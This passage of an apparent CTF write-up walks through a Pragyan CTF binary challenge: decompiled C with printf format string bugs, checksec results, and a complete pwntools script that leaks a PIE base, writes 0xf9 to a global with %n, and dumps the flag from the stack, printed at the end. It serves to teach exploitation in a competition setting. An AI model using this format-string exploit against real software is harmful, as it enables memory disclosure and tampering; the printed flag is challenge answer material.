</span></span><span style="display:flex;"><span>  } <span style="color:#069;font-weight:bold">while</span>( <span style="color:#366">true</span> );
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>see_balance:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">see_balance</span>(<span style="color:#078;font-weight:bold">void</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> in_FS_OFFSET;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">char</span> local_78 [<span style="color:#f60">104</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> local_10;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  local_10 <span style="color:#555">=</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(in_FS_OFFSET <span style="color:#555">+</span> <span style="color:#f60">0x28</span>);
</span></span><span style="display:flex;"><span>  printf(<span style="color:#c30">&#34;You currently have Rs.%d left!</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>,(ulong)b);
</span></span><span style="display:flex;"><span>  puts(<span style="color:#c30">&#34;Wanna upgrade pack?&#34;</span>);
</span></span><span style="display:flex;"><span>  fgets(local_78,<span style="color:#f60">100</span>,stdin);
</span></span><span style="display:flex;"><span>  printf(local_78);
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (local_10 <span style="color:#555">!=</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(in_FS_OFFSET <span style="color:#555">+</span> <span style="color:#f60">0x28</span>)) {
</span></span><span style="display:flex;"><span>                    <span style="color:#09f;font-style:italic">/* WARNING: Subroutine does not return */</span>
</span></span><span style="display:flex;"><span>    __stack_chk_fail();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>init_pack:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">init_pack</span>(<span style="color:#078;font-weight:bold">void</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (b <span style="color:#555">==</span> <span style="color:#f60">0xf9</span>) {
</span></span><span style="display:flex;"><span>    upgrade_pack();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">else</span> {
</span></span><span style="display:flex;"><span>    puts(<span style="color:#c30">&#34;You do not have enough balance :(&#34;</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>upgrade_pack</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>undefined8 <span style="color:#c0f">upgrade_pack</span>(<span style="color:#078;font-weight:bold">void</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  FILE <span style="color:#555">*</span>__stream;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">char</span> <span style="color:#555">*</span>__s;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> in_FS_OFFSET;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">char</span> local_98 [<span style="color:#f60">136</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> local_10;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  local_10 <span style="color:#555">=</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(in_FS_OFFSET <span style="color:#555">+</span> <span style="color:#f60">0x28</span>);
</span></span><span style="display:flex;"><span>  __stream <span style="color:#555">=</span> fopen(<span style="color:#c30">&#34;flag_maybe&#34;</span>,<span style="color:#c30">&#34;r&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (__stream <span style="color:#555">==</span> (FILE <span style="color:#555">*</span>)<span style="color:#f60">0x0</span>) {
</span></span><span style="display:flex;"><span>    puts(<span style="color:#c30">&#34;Flag not found.&#34;</span>);
</span></span><span style="display:flex;"><span>                    <span style="color:#09f;font-style:italic">/* WARNING: Subroutine does not return */</span>
</span></span><span style="display:flex;"><span>    exit(<span style="color:#f60">1</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  fgets(local_98,<span style="color:#f60">0x80</span>,__stream);
</span></span><span style="display:flex;"><span>  fclose(__stream);
</span></span><span style="display:flex;"><span>  puts(<span style="color:#c30">&#34;Upgrading PAcK&#34;</span>);
</span></span><span style="display:flex;"><span>  __s <span style="color:#555">=</span> (<span style="color:#078;font-weight:bold">char</span> <span style="color:#555">*</span>)malloc(<span style="color:#f60">0x12d</span>);
</span></span><span style="display:flex;"><span>  puts(<span style="color:#c30">&#34;Enter coupon code:&#34;</span>);
</span></span><span style="display:flex;"><span>  fgets(__s,<span style="color:#f60">300</span>,stdin);
</span></span><span style="display:flex;"><span>  puts(<span style="color:#c30">&#34;Upgrading pack with the coupon:&#34;</span>);
</span></span><span style="display:flex;"><span>  printf(__s);
</span></span><span style="display:flex;"><span>  check <span style="color:#555">=</span> <span style="color:#f60">1</span>;
</span></span><span style="display:flex;"><span>  see_profile();
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (local_10 <span style="color:#555">!=</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(in_FS_OFFSET <span style="color:#555">+</span> <span style="color:#f60">0x28</span>)) {
</span></span><span style="display:flex;"><span>                    <span style="color:#09f;font-style:italic">/* WARNING: Subroutine does not return */</span>
</span></span><span style="display:flex;"><span>    __stack_chk_fail();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="analysis-2">Analysis <a href="#analysis-2" class="anchor">#</a></h4>
<p>Reading through the decompiled code, some notes that we could take:</p>
<ul>
<li>Reading through the <code>see_balance</code> method, we notice bug where format string attack is applicable.</li>
<li>In order to call <code>upgrade_pack</code> method, in the <code>init_pack</code> method, we need to make the global variable of <code>b</code> value to <code>0xf9</code>.</li>
<li>Reading through the <code>upgrade_pack</code> method, we notice bug where format string attack is applicable.</li>
<li>Flag was stored in the <code>upgrade_pack</code> method stack.</li>
</ul>
<p>Let&rsquo;s do checksec to check further mitigation on the binary.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Arch:     amd64-64-little
</span></span><span style="display:flex;"><span>RELRO:    Full RELRO
</span></span><span style="display:flex;"><span>Stack:    Canary found
</span></span><span style="display:flex;"><span>NX:       NX enabled
</span></span><span style="display:flex;"><span>PIE:      PIE enabled
</span></span></code></pre></td></tr></table>
</div>
</div><p>Okay so the PIE is enabled, which mean we might need to leak the binary base address first.</p>
<h4 id="solution-2">Solution <a href="#solution-2" class="anchor">#</a></h4>
<p>Based on those notes, my idea to solve this is:</p>
<ul>
<li>With the format string bug on <code>see_balance</code>, I will try to leak the <code>main</code> address, so that I can retrieve the binary base address</li>
<li>After that, with the same bug, I will overwrite the value <code>b</code> with <code>0xf9</code>, so that I can go to the <code>upgrade_pack</code> method.</li>
<li>With the format string bug on <code>upgrade_pack</code> method, because the <code>flag</code> was stored in the stack, I can simply leak the flag.</li>
</ul>
<p>Below is the full script of that</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">pwn</span> <span style="color:#069;font-weight:bold">import</span> <span style="color:#555">*</span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">pwn</span> <span style="color:#069;font-weight:bold">import</span> p64, u64, p32, u32
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>arch <span style="color:#555">=</span> <span style="color:#c30">&#39;amd64&#39;</span>
</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>encoding <span style="color:#555">=</span> <span style="color:#c30">&#39;latin&#39;</span>
</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>log_level <span style="color:#555">=</span> <span style="color:#c30">&#39;INFO&#39;</span>
</span></span><span style="display:flex;"><span>warnings<span style="color:#555">.</span>simplefilter(<span style="color:#c30">&#34;ignore&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>elf <span style="color:#555">=</span> ELF(<span style="color:#c30">&#39;./load&#39;</span>)
</span></span><span style="display:flex;"><span>r <span style="color:#555">=</span> remote(<span style="color:#c30">&#39;binary.challs.pragyanctf.tech&#39;</span>, <span style="color:#f60">6003</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Leaked main</span>
</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Pack</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#39;</span>, <span style="color:#366">str</span>(<span style="color:#f60">1</span>)<span style="color:#555">.</span>encode())
</span></span><span style="display:flex;"><span>fmt_str <span style="color:#555">=</span> <span style="color:#c30">b</span><span style="color:#c30">&#39;a&#39;</span><span style="color:#555">*</span><span style="color:#f60">8</span> <span style="color:#555">+</span> <span style="color:#c30">b</span><span style="color:#c30">&#39;.%19$p.%20$p.%21$p&#39;</span> <span style="color:#09f;font-style:italic"># the 21th is the main+164 address value</span>
</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;pack?</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#39;</span>, fmt_str)
</span></span><span style="display:flex;"><span>out <span style="color:#555">=</span> r<span style="color:#555">.</span>recvline()<span style="color:#555">.</span>strip()<span style="color:#555">.</span>split(<span style="color:#c30">b</span><span style="color:#c30">&#39;.&#39;</span>)
</span></span><span style="display:flex;"><span>leaked_main <span style="color:#555">=</span> <span style="color:#366">int</span>(out[<span style="color:#555">-</span><span style="color:#f60">1</span>], <span style="color:#f60">16</span>)
</span></span><span style="display:flex;"><span>elf<span style="color:#555">.</span>address <span style="color:#555">=</span> leaked_main <span style="color:#555">-</span> elf<span style="color:#555">.</span>symbols[<span style="color:#c30">&#39;main&#39;</span>] <span style="color:#555">-</span> <span style="color:#f60">164</span>
</span></span><span style="display:flex;"><span>b_addr <span style="color:#555">=</span> elf<span style="color:#555">.</span>symbols[<span style="color:#c30">&#34;b&#34;</span>]
</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;Leaked main: </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(leaked_main)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;Elf address: </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(elf<span style="color:#555">.</span>address)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;b address  : </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(b_addr)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># val = 0xf9</span>
</span></span><span style="display:flex;"><span>fmt_str <span style="color:#555">=</span> <span style="color:#c30">b</span><span style="color:#c30">&#39;</span><span style="color:#a00">%249c</span><span style="color:#c30">%8$naaaaaaa&#39;</span><span style="color:#555">+</span>p64(b_addr) <span style="color:#09f;font-style:italic"># 8th index is our p64(b_addr) value, which mean we will write 249 (0xf9) to b variable.</span>
</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(fmt_str)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Pack</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#39;</span>, <span style="color:#366">str</span>(<span style="color:#f60">1</span>)<span style="color:#555">.</span>encode())
</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;pack?</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#39;</span>, fmt_str)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Pack</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#39;</span>, <span style="color:#366">str</span>(<span style="color:#f60">2</span>)<span style="color:#555">.</span>encode())
</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;coupon code:</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;%8$p %9$p %10$p %11$p&#39;</span>) <span style="color:#09f;font-style:italic"># Flag was stored in 8th-11th index</span>
</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>recvline()
</span></span><span style="display:flex;"><span>out <span style="color:#555">=</span> r<span style="color:#555">.</span>recvline()<span style="color:#555">.</span>strip()<span style="color:#555">.</span>split(<span style="color:#c30">b</span><span style="color:#c30">&#39; &#39;</span>)[<span style="color:#555">-</span><span style="color:#f60">4</span>:]
</span></span><span style="display:flex;"><span>flag <span style="color:#555">=</span> <span style="color:#c30">b</span><span style="color:#c30">&#39;&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">for</span> f <span style="color:#000;font-weight:bold">in</span> out:
</span></span><span style="display:flex;"><span>    flag <span style="color:#555">+=</span> p64(<span style="color:#366">int</span>(f, <span style="color:#f60">16</span>))
</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;Flag: </span><span style="color:#a00">{</span>flag<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>Flag: p_ctf{W3ll_1t_W4s_3aSy_0n1y}</p>
</blockquote>
